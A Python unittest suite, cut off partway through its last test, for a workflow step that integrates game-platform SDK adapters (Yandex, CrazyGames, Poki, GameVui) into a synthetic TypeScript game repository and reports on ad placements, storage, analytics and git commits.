"""The integration phase of the `sdk` step (scripts/wgf_sdk/integration.py).

test_sdk_module.py covers the conformance phase; this covers what the step writes into the
game and how that is laid over the conformance result. Deterministic and offline, per
docs/workflow-module-contract.md §11: the game repository is a small synthetic one written
per test, node, pnpm and git are a fake runner, and the conformance evidence is the real
report fixture test_sdk_module.py reads. The one
test that reads a real template checkout skips when the sibling web-game-template is absent.
What the TypeScript it writes does at runtime is tested by that TypeScript's own suite, in
the game repository.

Run from the repository root:

    python -m unittest discover scripts/tests
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.dirname(HERE)
sys.path.insert(0, SCRIPTS)
sys.path.insert(0, HERE)

import pinned_template  # noqa: E402

from wgflib import paths  # noqa: E402
from wgflib.hashing import content_hash  # noqa: E402
from wgflib.workflow.api import RunRequest, WorkflowAPI  # noqa: E402
from wgflib.workflow.config import FactoryConfig  # noqa: E402
from wgflib.workflow.contracts import ArtifactContracts  # noqa: E402
from wgflib.workflow.model import RunStatus, StepOutcome, StepStatus  # noqa: E402
from wgflib.workflow.step import StepRegistry  # noqa: E402

import wgf_sdk  # noqa: E402
from wgf_sdk import evidence, integrate  # noqa: E402
from wgf_sdk.design import classify_trigger  # noqa: E402
from wgf_sdk.inspect_sdk import inspect_sdk  # noqa: E402
from wgf_sdk.runner import SCENARIOS, TEST_FILE, CommandResult, run_tests  # noqa: E402
from wgf_sdk.step import SdkStep  # noqa: E402

CONFORMANCE = os.path.join(HERE, "fixtures", "sdk-conformance.json")


IDENTITY = ["-c", "user.name=Test", "-c", "user.email=test@example.invalid"]


def git(root, *args, check=True):
    """Real git: the step establishes, and makes, its commit in the synthetic repository."""
    done = subprocess.run(["git", *IDENTITY, *args], cwd=root, capture_output=True, text=True)
    if check and done.returncode != 0:
        raise AssertionError(f"git {' '.join(args)}: {done.stderr}")
    return done


def commit_checkout(root, message="feat(game): what develop committed"):
    """Commit whatever the test wrote, as the develop step would have. Returns HEAD."""
    if not os.path.isdir(os.path.join(root, ".git")):
        git(root, "init", "-q")
        write(root, ".gitignore", "node_modules/\n/build/\n")
    if git(root, "status", "--porcelain").stdout.strip() or \
            git(root, "rev-parse", "HEAD", check=False).returncode != 0:
        git(root, "add", "--all")
        git(root, "commit", "-q", "--no-verify", "-m", message)
    return git(root, "rev-parse", "HEAD").stdout.strip()


class Conformance(evidence.ConformanceRunner):
    """The conformance phase's evidence: the real suite's report, never a pnpm run. It ran
    where the checkout's HEAD is, as the real runner's `git rev-parse HEAD` says."""

    def run(self, game_repo, browser=False):
        with open(CONFORMANCE, encoding="utf-8") as handle:
            head = git(game_repo, "rev-parse", "HEAD", check=False).stdout.strip() or None
            return evidence.ConformanceRun(json.load(handle), head)


class Step(SdkStep):
    clock = staticmethod(lambda: "2026-09-23T00:00:00Z")
    runner_factory = Conformance

FIXTURES = os.path.join(SCRIPTS, "wgflib", "workflow", "fixtures")

# -- a synthetic game repository, in the shape web-game-template gives one -------------------

TYPES_TS = """\
export type AdKind = "interstitial" | "rewarded" | "banner";

export interface Platform {
  readonly id: string;
  readonly capabilities: PlatformCapabilities;
  readonly storage: PlatformStorage;
  readonly usage: PlatformUsage;
  /** Subscribe to a signal. */
  on<K extends keyof PlatformEvents>(
    event: K,
    handler: (payload: PlatformEvents[K]) => void,
  ): () => void;
  initialize(): Promise<void>;
  reportLoadingProgress(fraction: number): void;
  signalReady(): Promise<void>;
  gameplayStart(): void;
  gameplayStop(): void;
  showInterstitial(): Promise<AdResult>;
  showRewarded(): Promise<RewardedResult>;
}
"""

REGISTRY_TS = """\
import { CrazyGamesPlatform } from "./adapters/crazygames/platform.js";
import { GenericWebPlatform } from "./adapters/generic-web.js";
import { YandexPlatform } from "./adapters/yandex.js";
import type { Platform } from "./types.js";

export function createPlatform(id: string, options: CreatePlatformOptions): Platform {
  switch (id) {
    case "generic-web":
      return new GenericWebPlatform({ namespace: options.namespace });
    case "yandex":
      return new YandexPlatform({ namespace: options.namespace });
    case "crazygames":
      return new CrazyGamesPlatform({ namespace: options.namespace });
    case "poki":
    case "gamevui":
      throw new Error(`Platform adapter "${id}" is not implemented yet.`);
    default:
      throw new Error(`Unknown platform "${id}".`);
  }
}
"""


def adapter_ts(class_name, constant, ads, cloud_saves, url=None,
               analytics="platform-provided"):
    url_line = f'export const {constant.split("_")[0]}_SDK_URL = "{url}";\n' if url else ""
    ads_literal = "[" + ", ".join(f'"{a}"' for a in ads) + "]"
    return (
        f"{url_line}"
        f"export const {constant}: PlatformCapabilities = {{\n"
        f"  ads: {ads_literal},\n"
        f"  iap: false,\n"
        f"  // a comment inside the literal\n"
        f"  cloudSaves: {'true' if cloud_saves else 'false'},\n"
        f"  leaderboards: false,\n"
        f'  analytics: "{analytics}",\n'
        f"  interstitialMinIntervalS: null,\n"
        f"}};\n\n"
        f"export class {class_name} implements Platform {{\n"
        f"  readonly capabilities = {constant};\n"
        f"}}\n"
    )


MAIN_TS = """\
import { Game } from "@wgf/game-core";
import { createPlatform } from "@wgf/platform-sdk";
import { config, primaryPlatform } from "./core/config.js";
import { bindPlatform } from "./platform/bind.js";

async function main(): Promise<void> {
  const platform = createPlatform(primaryPlatform().id, { namespace: config.game.id });
  await platform.initialize();
  platform.reportLoadingProgress(0.5);

  const game = new Game();
  bindPlatform(game, platform, {
    onAudioMutedChange: (muted) => {
      document.documentElement.dataset["audioMuted"] = String(muted);
    },
  });

  platform.reportLoadingProgress(1);
  await platform.signalReady();
  game.start();
  platform.gameplayStart();
}

void main();
"""

# What the develop step would write: a run that ends in a miss.
SCENE_TS = """\
import { gameplay } from "../platform/gameplay.js";

export async function onMiss(score: number, accept: () => Promise<boolean>): Promise<void> {
  const session = gameplay();
  session.gameOver({ score });
  const best = await session.load("best", 0);
  await session.save("best", Math.max(best, score));
  if (session.canOfferReward("game-over") && (await accept())) {
    if (await session.offerReward("game-over")) return session.runStarted();
  }
  await session.naturalBreak("game-over");
  session.runStarted();
}
"""

GAME_CONFIG = """\
game:
  id: test-game
  name: Test Game
  version: 0.1.0
engine:
  type: pixijs
platforms:
  - { id: yandex, profile: yandex@1.0.0, role: required }
  - { id: crazygames, profile: crazygames@1.0.0, role: optional }
  - { id: poki, profile: poki@1.0.0, role: optional }
  - { id: gamevui, profile: gamevui@1.0.0, role: optional }
monetization:
  ad_kinds: [rewarded, interstitial]
  iap: false
"""


def write(root, relative, text):
    path = os.path.join(root, *relative.split("/"))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)
    return path


def read(root, relative):
    with open(os.path.join(root, *relative.split("/")), encoding="utf-8") as handle:
        return handle.read()


def make_repo(root, scene=True, node_modules=True, main=MAIN_TS, game_config=GAME_CONFIG):
    sdk = "packages/platform-sdk"
    write(root, f"{sdk}/package.json", json.dumps({"name": "@wgf/platform-sdk",
                                                    "version": "0.1.0"}))
    write(root, f"{sdk}/src/types.ts", TYPES_TS)
    write(root, f"{sdk}/src/registry.ts", REGISTRY_TS)
    write(root, f"{sdk}/src/adapters/generic-web.ts",
          adapter_ts("GenericWebPlatform", "GENERIC_WEB_CAPABILITIES", [], False,
                     analytics="self-hosted"))
    write(root, f"{sdk}/src/adapters/yandex.ts",
          adapter_ts("YandexPlatform", "YANDEX_CAPABILITIES", ["interstitial", "rewarded"],
                     True, url="/sdk.js"))
    write(root, f"{sdk}/src/adapters/crazygames/platform.ts",
          adapter_ts("CrazyGamesPlatform", "CRAZYGAMES_CAPABILITIES",
                     ["interstitial", "rewarded"], True))
    write(root, f"{sdk}/src/adapters/crazygames/sdk.ts",
          'export const CRAZYGAMES_SDK_URL = "https://sdk.example/v3.js";\n')
    write(root, "game.config.yaml", game_config)
    if main is not None:
        write(root, "src/main.ts", main)
    write(root, "src/platform/bind.ts", "export function bindPlatform(): void {}\n")
    if scene:
        write(root, "src/game/run-scene.ts", SCENE_TS)
    if node_modules:
        os.makedirs(os.path.join(root, "node_modules"), exist_ok=True)
    commit_checkout(root)
    return root


# -- fakes --------------------------------------------------------------------------------------

class FakeRunner:
    """node and pnpm, scripted; git real (or absent, `git=False`). Records every command."""

    def __init__(self, failing_scenarios=(), tsc_output=None, git=True, pnpm=True):
        self.calls = []
        self.failing = set(failing_scenarios)
        self.tsc_output = tsc_output
        self.git = git
        self.pnpm = pnpm

    def run(self, argv, cwd, timeout):
        self.calls.append(list(argv))
        if argv[0] == "git":
            if not self.git:
                return None
            done = git(cwd, *argv[1:], check=False)
            return CommandResult(done.returncode, done.stdout, done.stderr)
        if not self.pnpm:
            return None
        if "vitest" in argv:
            output = next(a.split("=", 1)[1] for a in argv if a.startswith("--outputFile="))
            results = [{"ancestorTitles": [s], "status": "failed" if s in self.failing
                        else "passed"} for s in SCENARIOS for _ in range(2)]
            with open(output, "w", encoding="utf-8") as handle:
                json.dump({"testResults": [{"assertionResults": results}]}, handle)
            return CommandResult(1 if self.failing else 0, "", "")
        if "tsc" in argv:
            if self.tsc_output:
                return CommandResult(2, self.tsc_output, "")
            return CommandResult(0, "", "")
        raise AssertionError(f"unexpected command {argv}")


class FakeRef:
    def __init__(self, content):
        self.content_hash = (content.get("provenance") or {}).get("content_hash")
        self.schema_version = "1.0.0"


class FakeInputs:
    def __init__(self, **artifacts):
        self.artifacts = {k.replace("_", "-"): v for k, v in artifacts.items() if v is not None}
        self.refs = {k: FakeRef(v) for k, v in self.artifacts.items()}
        self.missing = []

    def __contains__(self, artifact_type):
        return artifact_type in self.artifacts

    def load(self, artifact_type):
        return self.artifacts.get(artifact_type)


class FakeLogger:
    def __init__(self):
        self.records = []

    def info(self, message, **fields):
        self.records.append((message, fields))

    debug = warning = error = info


# As shipped in workspace/config/factory.yaml.
SDK_CONFIG = {
    "adapter_substitutes": {"gamevui": "generic-web"},
    "break_on_continue": ["poki"],
    "interstitial_forbidden_moments": {"crazygames": ["pause-menu"]},
}


class FakeContext:
    def __init__(self, sdk=None):
        self.config = FactoryConfig({"sdk": sdk or SDK_CONFIG})
        self.environment = {"now": "2026-09-23T00:00:00Z"}
        self.execution = 1
        self.project_id = "mock-title"
        self.logger = FakeLogger()


class FakeDefinition:
    def __init__(self, params):
        self.id = "sdk"
        self.type = "sdk"
        self.params = params
        self.outputs = ["sdk-report"]


def fixture(name):
    with open(os.path.join(FIXTURES, f"{name}.json"), encoding="utf-8") as handle:
        body = json.load(handle)
    body["provenance"] = {"artifact_id": f"wgf:{name}:mock-title:20260101-01",
                          "content_hash": "sha256:" + "0" * 64}
    return body


class SdkCase(unittest.TestCase):
    def setUp(self):
        self.scratch = tempfile.mkdtemp(prefix="wgf-sdk-")
        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
        self.repo = os.path.join(self.scratch, "game")
        self.design = fixture("game-design")
        self.scaffold = fixture("scaffold-record")

    def execute(self, runner=None, params=None, sdk=None, commit_first=True, **inputs):
        runner = runner or FakeRunner()
        if os.path.isdir(self.repo) and commit_first:
            self.base = commit_checkout(self.repo)
        step = Step(FakeDefinition({"game_repo": self.repo, **(params or {})}))
        step.integration_runner_factory = lambda: runner
        artifacts = {"game_design": self.design, "scaffold_record": self.scaffold}
        artifacts.update(inputs)
        self.runner = runner
        context = FakeContext(sdk)
        # Where the step keeps its ledger of the commits it made: outside the checkout.
        context.run_dir = os.path.join(self.scratch, "run")
        return step.execute(FakeInputs(**artifacts), context)

    def report(self, result):
        self.assertEqual(len(result.artifacts), 1)
        return result.artifacts[0].content

    def platform(self, report, platform_id):
        return next(p for p in report["platforms"] if p["platform_id"] == platform_id)

    def feature(self, report, platform_id, feature):
        return next(f for f in self.platform(report, platform_id)["features"]
                    if f["feature"] == feature)


# -- reading the SDK ----------------------------------------------------------------------------

class InspectSdk(SdkCase):
    def test_reads_the_api_the_registry_and_each_adapter(self):
        sdk = inspect_sdk(make_repo(self.repo))
        self.assertEqual((sdk.package, sdk.version, sdk.problems),
                         ("@wgf/platform-sdk", "0.1.0", []))
        self.assertEqual(sdk.members, [
            "id", "capabilities", "storage", "usage", "on", "initialize",
            "reportLoadingProgress", "signalReady", "gameplayStart", "gameplayStop",
            "showInterstitial", "showRewarded"])

        yandex = sdk.adapter("yandex")
        self.assertEqual((yandex.class_name, yandex.source),
                         ("YandexPlatform", "packages/platform-sdk/src/adapters/yandex.ts"))
        self.assertEqual(yandex.capabilities["ads"], ["interstitial", "rewarded"])
        self.assertIs(yandex.capabilities["cloudSaves"], True)
        self.assertIsNone(yandex.capabilities["interstitialMinIntervalS"])
        self.assertEqual(yandex.portal_sdk["url"], "/sdk.js")

        # An adapter in its own directory keeps its portal SDK URL beside it; one directly
        # under adapters/ never borrows another adapter's.
        self.assertEqual(sdk.adapter("crazygames").portal_sdk["url"], "https://sdk.example/v3.js")
        self.assertIsNone(sdk.adapter("generic-web").portal_sdk)

        for missing in ("poki", "gamevui", "never-heard-of-it"):
            self.assertFalse(sdk.adapter(missing).implemented, missing)

    def test_a_repository_without_the_template_sdk_is_not_inspected(self):
        os.makedirs(self.repo)
        self.assertIsNone(inspect_sdk(self.repo))

    def test_what_cannot_be_read_is_reported_not_guessed(self):
        make_repo(self.repo)
        write(self.repo, "packages/platform-sdk/src/adapters/yandex.ts",
              "export class YandexPlatform {}\n")
        sdk = inspect_sdk(self.repo)
        self.assertIsNone(sdk.adapter("yandex").capabilities)
        self.assertTrue(any("YandexPlatform" in p for p in sdk.problems))

    def test_capabilities_handed_to_a_base_class_are_read(self):
        # web-game-template 1f5dee2: `class GameVuiPlatform extends NoSdkPlatform` passes its
        # capabilities through super(); the base class's own field assignment is not them.
        make_repo(self.repo)
        write(self.repo, "packages/platform-sdk/src/adapters/generic-web.ts",
              "export const GENERIC_WEB_CAPABILITIES: PlatformCapabilities = {\n"
              "  ads: [],\n  iap: false,\n  cloudSaves: false,\n  leaderboards: false,\n"
              "  analytics: \"self-hosted\",\n  interstitialMinIntervalS: null,\n};\n"
              "export class NoSdkPlatform {\n"
              "  readonly capabilities;\n"
              "  constructor(id, capabilities, options) { this.capabilities = capabilities; }\n"
              "}\n"
              "export class GenericWebPlatform extends NoSdkPlatform {\n"
              "  constructor(options) { super(\"generic-web\", GENERIC_WEB_CAPABILITIES, options); }\n"
              "}\n")
        sdk = inspect_sdk(self.repo)
        self.assertIsNotNone(sdk.adapter("generic-web").capabilities)
        self.assertFalse([p for p in sdk.problems if "GenericWebPlatform" in p])

    @unittest.skipUnless(pinned_template.checkout()[0], pinned_template.checkout()[1])
    def test_the_pinned_template_is_readable(self):
        # The template this Factory is pinned to (workspace/config/template.lock.json), not
        # whatever the sibling working copy is at: drift fails here only when the pin moves.
        template = pinned_template.checkout()[0]
        sdk = inspect_sdk(template)
        self.assertEqual(sdk.problems, [])
        self.assertTrue(sdk.adapter("generic-web").implemented)
        for member in ("initialize", "signalReady", "showRewarded", "showInterstitial"):
            self.assertIn(member, sdk.members)
        main = os.path.join(template, "src", "main.ts")
        if os.path.exists(main):
            os.makedirs(os.path.join(self.repo, "src"))
            shutil.copy(main, os.path.join(self.repo, "src", "main.ts"))
            self.assertEqual(integrate.patch_main(self.repo)["action"], "patched")


class Triggers(unittest.TestCase):
    def test_design_prose_maps_to_a_gameplay_moment(self):
        cases = {
            "On death, offer a continue": "game-over",
            "On a miss that ends a run above the player's median score": "game-over",
            "Between runs, at most once every 180 seconds": "game-over",
            "On level fail, offer a retry": "game-over",
            "Between levels": "level-complete",
            "Level complete: double the coins": "level-complete",
            "Opening the pause menu": "pause-menu",
            "Every 90 seconds": None,
        }
        for trigger, moment in cases.items():
            self.assertEqual(classify_trigger(trigger), moment, trigger)


# -- the step -----------------------------------------------------------------------------------

class Integration(SdkCase):
    def test_integrates_what_the_design_needs_into_the_game(self):
        make_repo(self.repo)
        result = self.execute()
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error or result.message)
        report = self.report(result)

        # Files: the layer and its suite, the generated plan, the patched boot.
        actions = {f["path"]: f["action"] for f in report["integration"]["files"]}
        self.assertEqual(actions, {
            "src/platform/gameplay.ts": "created",
            TEST_FILE: "created",
            "src/platform/integration-plan.ts": "created",
            "src/main.ts": "patched",
        })
        main = read(self.repo, "src/main.ts")
        self.assertIn("await bootPlatform(primaryPlatform().id, {", main)
        self.assertIn("gameplay.runStarted();", main)
        self.assertNotIn("createPlatform", main)
        self.assertNotIn("platform.gameplayStart();", main)

        plan = read(self.repo, "src/platform/integration-plan.ts")
        self.assertIn('id: "rewarded-game-over"', plan)
        self.assertIn('platforms: ["yandex", "crazygames"]', plan)
        self.assertIn('gamevui: "generic-web"', plan)
        self.assertIn('breakOnContinue: ["poki"]', plan)
        self.assertNotIn("initTimeoutMs", plan)

        # Yandex: every needed feature working in both phases - the conformance suite's
        # adapter scenarios and the game's own wiring. Analytics is Yandex's to measure.
        yandex = self.platform(report, "yandex")
        self.assertEqual(yandex["status"], "working")
        analytics = self.feature(report, "yandex", "analytics")
        self.assertEqual(analytics["status"], "not-required")
        self.assertIn("platform-provided", analytics["note"])
        self.assertEqual(yandex["adapter"], {
            "status": "implemented", "adapter_id": "yandex", "class": "YandexPlatform",
            "source": "packages/platform-sdk/src/adapters/yandex.ts", "portal_sdk": "/sdk.js"})
        rewarded = self.feature(report, "yandex", "rewarded")
        self.assertEqual(rewarded["status"], "working")
        self.assertEqual(rewarded["hooks"], ["can-offer-reward:game-over",
                                             "offer-reward:game-over"])
        self.assertIn("not observed on the portal", rewarded["observed_by"])
        self.assertIn("conformance suite", rewarded["observed_by"])
        self.assertIn("fallback", rewarded)

        # GameVui: no SDK, so the configured substitute - and no cloud saves on it.
        gamevui = self.platform(report, "gamevui")
        self.assertEqual(gamevui["adapter"]["status"], "substituted")
        self.assertEqual(gamevui["adapter"]["adapter_id"], "generic-web")
        cloud = self.feature(report, "gamevui", "storage")
        self.assertEqual(cloud["status"], "working")  # persistence works; it is local
        self.assertIn("local storage", cloud["note"])
        # The title committed to rewarded ads; GameVui serves none (conformance: unservable).
        self.assertEqual(self.feature(report, "gamevui", "rewarded")["status"], "not-started")

        # Interstitial hooks: the break at that moment, directly or through continueFrom.
        self.assertEqual(self.feature(report, "yandex", "interstitial")["hooks"],
                         ["natural-break:game-over|continue-from:game-over"])

        # Poki: no adapter in this SDK revision, and optional, so reported and not blocking.
        poki = self.platform(report, "poki")
        self.assertEqual((poki["status"], poki["adapter"]["status"]), ("not-started", "missing"))

        # CrazyGames: the conformance suite ran on a template ref without its adapter, so
        # nothing there is working, whatever this repository's own adapter could do.
        self.assertEqual(self.platform(report, "crazygames")["status"], "not-started")
        self.assertIn("no adapter on this ref",
                      self.feature(report, "crazygames", "interstitial")["note"])

        hooks = {h["hook"]: h for h in report["integration"]["game_hooks"]}
        self.assertEqual(hooks["game-over"]["locations"], ["src/game/run-scene.ts:5"])
        self.assertFalse(hooks["tracker"]["wired"])
        self.assertEqual(report["integration"]["tests"]["status"], "passed")
        self.assertEqual([s["id"] for s in report["integration"]["tests"]["scenarios"]],
                         list(SCENARIOS))
        # Committed once, keyed, on the commit it was given; the evidence is about that commit.
        self.assertEqual(report["integration"]["repository_state"], "clean")
        head = git(self.repo, "rev-parse", "HEAD").stdout.strip()
        self.assertEqual(report["build_ref"], {"commit_sha": head, "base_commit_sha": self.base,
                                               "sdk_commits": [head]})
        self.assertEqual(git(self.repo, "rev-parse", "HEAD~1").stdout.strip(), self.base)
        self.assertIn("Wgf-Sdk-Key: local:sdk:1",
                      git(self.repo, "log", "-1", "--format=%B").stdout)

    def test_a_self_hosted_platform_needs_the_game_to_wire_a_tracker(self):
        make_repo(self.repo)
        before = self.feature(self.report(self.execute()), "gamevui", "analytics")
        self.assertEqual(before["status"], "partial")
        self.assertIn("tracker", before["note"])
        main = read(self.repo, "src/main.ts").replace(
            "{ target: booted.target }", "{ target: booted.target, tracker: analytics }")
        write(self.repo, "src/main.ts", main)
        after = self.feature(self.report(self.execute()), "gamevui", "analytics")
        self.assertEqual(after["status"], "working")

    def test_a_silent_game_has_nothing_to_mute(self):
        make_repo(self.repo, main=MAIN_TS.replace("onAudioMutedChange", "onSomethingElse"))
        audio = self.feature(self.report(self.execute()), "yandex", "audio-mute")
        self.assertEqual(audio["status"], "not-required")
        write(self.repo, "src/game/sound.ts", "export const ctx = new AudioContext();\n")
        audio = self.feature(self.report(self.execute()), "yandex", "audio-mute")
        self.assertEqual(audio["status"], "partial")

    def test_the_artifact_passes_the_engine_contract(self):
        make_repo(self.repo)
        report = self.report(self.execute())
        self.assertEqual(ArtifactContracts()("sdk-report", report), [])
        self.assertEqual(report["provenance"]["content_hash"], content_hash(report))
        self.assertEqual(report["provenance"]["schema_version"], "1.2.0")
        self.assertEqual(report["provenance"]["produced_by"], {"role": "sdk",
                                                               "actor": "automation"})
        self.assertEqual([i["artifact_type"] for i in report["provenance"]["inputs"]],
                         ["game-design", "scaffold-record"])

    def test_a_second_run_changes_nothing(self):
        make_repo(self.repo)
        first = self.report(self.execute())
        snapshot = {p: read(self.repo, p) for p in (*integrate.OWNED_FILES, integrate.PLAN_FILE,
                                                    integrate.MAIN_FILE)}
        second = self.report(self.execute())
        self.assertEqual({f["action"] for f in second["integration"]["files"]}, {"unchanged"})
        self.assertEqual(snapshot, {p: read(self.repo, p) for p in snapshot})
        strip = lambda r: {k: v for k, v in r.items() if k not in ("provenance", "integration")}
        self.assertEqual(strip(first), strip(second))

    def test_an_unwired_moment_is_partial_not_working(self):
        make_repo(self.repo, scene=False)
        report = self.report(self.execute())
        rewarded = self.feature(report, "yandex", "rewarded")
        self.assertEqual(rewarded["status"], "partial")
        self.assertIn("offer-reward:game-over", rewarded["note"])
        self.assertEqual(self.platform(report, "yandex")["status"], "partial")

    def test_design_placements_the_build_did_not_declare_are_not_integrated(self):
        make_repo(self.repo, game_config=GAME_CONFIG.replace("[rewarded, interstitial]",
                                                             "[interstitial]"))
        report = self.report(self.execute())
        placements = {p["id"]: p for p in report["integration"]["placements"]}
        self.assertFalse(placements["rewarded-game-over"]["integrated"])
        self.assertIn("ad_kinds", placements["rewarded-game-over"]["note"])
        self.assertNotIn("rewarded-game-over", read(self.repo, "src/platform/integration-plan.ts"))

    def test_poki_needs_a_break_before_every_continue(self):
        make_repo(self.repo)
        registry = REGISTRY_TS.replace(
            'import type', 'import { PokiPlatform } from "./adapters/poki.js";\nimport type'
        ).replace(
            '    case "poki":\n',
            '    case "poki":\n      return new PokiPlatform({ namespace: options.namespace });\n')
        write(self.repo, "packages/platform-sdk/src/registry.ts", registry)
        write(self.repo, "packages/platform-sdk/src/adapters/poki.ts",
              adapter_ts("PokiPlatform", "POKI_CAPABILITIES", ["interstitial", "rewarded"], False))
        report = self.report(self.execute())
        interstitial = self.feature(report, "poki", "interstitial")
        self.assertIn("break_on_continue", interstitial["required_by"])
        self.assertEqual(interstitial["hooks"], ["continue-from|natural-break"])
        self.assertEqual(interstitial["status"], "working")

    def test_a_pause_menu_interstitial_skips_platforms_that_forbid_it(self):
        self.design["monetization"]["placements"].append(
            {"kind": "interstitial", "trigger": "Opening the pause menu"})
        make_repo(self.repo)
        report = self.report(self.execute())
        placement = next(p for p in report["integration"]["placements"]
                         if p["id"] == "interstitial-pause-menu")
        self.assertTrue(placement["integrated"])
        self.assertIn("crazygames", placement["note"])
        plan = read(self.repo, "src/platform/integration-plan.ts")
        block = plan[plan.index('id: "interstitial-pause-menu"'):]
        self.assertIn('platforms: ["yandex", "poki", "gamevui"]', block[:400])

    def test_a_banner_or_iap_placement_is_unsupported_with_a_fallback(self):
        self.design["monetization"]["placements"].append(
            {"kind": "banner", "trigger": "On the pause menu"})
        make_repo(self.repo)
        report = self.report(self.execute())
        banner = self.feature(report, "yandex", "banner")
        self.assertEqual(banner["status"], "unsupported")
        self.assertIn("no banner", banner["fallback"])

    def test_a_changed_boot_sequence_is_left_alone_and_reported(self):
        make_repo(self.repo, main="// hand-written boot\n")
        report = self.report(self.execute())
        main = next(f for f in report["integration"]["files"] if f["path"] == "src/main.ts")
        self.assertEqual(main["action"], "skipped")
        self.assertIn("by hand", main["note"])
        self.assertEqual(read(self.repo, "src/main.ts"), "// hand-written boot\n")
        self.assertEqual(self.feature(report, "yandex", "init")["status"], "partial")

    def test_a_boot_that_waits_for_the_player_keeps_waiting(self):
        main = MAIN_TS.replace("  game.start();\n  platform.gameplayStart();\n",
                               "  game.start();\n")
        make_repo(self.repo, main=main)
        self.execute()
        text = read(self.repo, "src/main.ts")
        self.assertIn("  installGameplay(\n", text)
        self.assertNotIn("const gameplay", text)  # unused, and lint would say so


# -- failure paths (contract §7) ----------------------------------------------------------------

SEAM_DEFAULT_TS = """\
import type { Platform } from "@wgf/platform-sdk";
import { type GameIntegration } from "../game/integration.js";

export class DefaultIntegration implements GameIntegration {
  constructor(readonly platform: Platform) {}
}
"""

SEAM_SCENE_TS = """\
import type { GameIntegration } from "./integration.js";

export async function onCrash(seam: GameIntegration): Promise<void> {
  seam.gameplayStop();
  await seam.save("best", "10");
  if (seam.canOfferRewarded("revive-after-crash") && (await seam.rewarded("revive-after-crash"))) {
    seam.gameplayStart();
    return;
  }
  await seam.interstitial("retry-break");
  seam.gameplayStart();
}

export async function onLevel(seam: GameIntegration): Promise<void> {
  await seam.interstitial("between-levels");
}
"""


class Seam(SdkCase):
    """A develop-step game: it calls src/game/integration.ts with its own placement ids."""

    def make_seam_game(self):
        from wgf_develop.brief import INTEGRATION_CONTRACT
        make_repo(self.repo, scene=False, main=MAIN_TS.replace(
            'import { bindPlatform } from "./platform/bind.js";\n',
            'import { bindPlatform } from "./platform/bind.js";\n'
            'import { DefaultIntegration } from "./platform/default-integration.js";\n'
            'import { onCrash } from "./game/run-scene.js";\n').replace(
            "  const game = new Game();\n",
            "  const game = new Game();\n  void onCrash(new DefaultIntegration(platform));\n"))
        write(self.repo, "src/game/integration.ts", INTEGRATION_CONTRACT)
        write(self.repo, "src/platform/default-integration.ts", SEAM_DEFAULT_TS)
        write(self.repo, "src/game/run-scene.ts", SEAM_SCENE_TS)

    def test_the_seam_is_wired_to_the_platform(self):
        self.make_seam_game()
        report = self.report(self.execute())
        actions = {f["path"]: f["action"] for f in report["integration"]["files"]}
        self.assertEqual(actions["src/platform/game-integration.ts"], "created")
        self.assertEqual(actions["src/main.ts (seam)"], "patched")
        main = read(self.repo, "src/main.ts")
        self.assertIn("void onCrash(new PlatformGameIntegration());", main)
        self.assertNotIn("DefaultIntegration", main)

        placements = {p["id"]: p for p in report["integration"]["placements"]}
        self.assertEqual((placements["revive-after-crash"]["moment"],
                          placements["revive-after-crash"]["integrated"]), ("game-over", True))
        # The design's "between runs" interstitial is at game over, on Yandex only.
        self.assertTrue(placements["retry-break"]["integrated"])
        # It places none between levels: that break of the game's stays unmonetized.
        self.assertFalse(placements["between-levels"]["integrated"])
        plan = read(self.repo, "src/platform/integration-plan.ts")
        self.assertIn('id: "revive-after-crash"', plan)
        block = plan[plan.index('id: "retry-break"'):]
        self.assertIn('platforms: ["yandex"]', block[:300])
        self.assertNotIn('id: "between-levels"', plan)

        rewarded = self.feature(report, "yandex", "rewarded")
        self.assertEqual(rewarded["status"], "working")
        hooks = {h["hook"]: h for h in report["integration"]["game_hooks"]}
        self.assertEqual(hooks["offer-reward:game-over"]["locations"][0],
                         "src/game/run-scene.ts:6")
        self.assertTrue(hooks["run-stop"]["wired"])

    def test_the_seam_is_rewired_once(self):
        self.make_seam_game()
        self.execute()
        second = self.report(self.execute())
        actions = {f["path"]: f["action"] for f in second["integration"]["files"]}
        self.assertEqual(actions["src/main.ts (seam)"], "unchanged")

    def test_without_the_seam_no_seam_files_are_written(self):
        make_repo(self.repo)
        report = self.report(self.execute())
        self.assertNotIn("src/platform/game-integration.ts",
                         [f["path"] for f in report["integration"]["files"]])


def prototype_at(commit):
    report = fixture("prototype-report")
    report["build_ref"] = {"commit_sha": commit}
    return report


class Commits(SdkCase):
    """The integration is committed once, keyed, on exactly develop's commit - or refused."""

    def head(self):
        return git(self.repo, "rev-parse", "HEAD").stdout.strip()

    def test_builds_on_the_prototype_commit_and_records_it_as_the_base(self):
        make_repo(self.repo)
        base = self.head()
        result = self.execute(prototype_report=prototype_at(base))
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error or result.message)
        build_ref = self.report(result)["build_ref"]
        self.assertEqual(build_ref, {"commit_sha": self.head(), "base_commit_sha": base,
                                     "sdk_commits": [self.head()]})
        self.assertNotEqual(self.head(), base)
        self.assertEqual(git(self.repo, "status", "--porcelain").stdout, "")

    def test_a_retry_finds_its_commit_instead_of_committing_again(self):
        make_repo(self.repo)
        base = self.head()
        first = self.report(self.execute(prototype_report=prototype_at(base)))["build_ref"]
        again = self.execute(prototype_report=prototype_at(base))
        self.assertEqual(again.outcome, StepOutcome.SUCCESS, again.error or again.message)
        self.assertEqual(self.report(again)["build_ref"], first)
        self.assertEqual(git(self.repo, "rev-list", "--count", f"{base}..HEAD").stdout.strip(),
                         "1")

    def test_an_integration_already_in_place_commits_nothing(self):
        make_repo(self.repo)
        self.execute()
        # develop's next commit already carries the integration (e.g. a later loop).
        commit_checkout(self.repo, "feat(game): a later development commit")
        base = self.head()
        result = self.execute(prototype_report=prototype_at(base))
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error or result.message)
        self.assertEqual(self.head(), base)
        self.assertEqual(self.report(result)["build_ref"],
                         {"commit_sha": base, "base_commit_sha": base, "sdk_commits": []})

    def test_a_commit_between_develop_and_sdk_is_refused(self):
        make_repo(self.repo)
        base = self.head()
        write(self.repo, "src/game/extra.ts", "export const unreviewed = true;\n")
        commit_checkout(self.repo, "fix: slipped in after review")
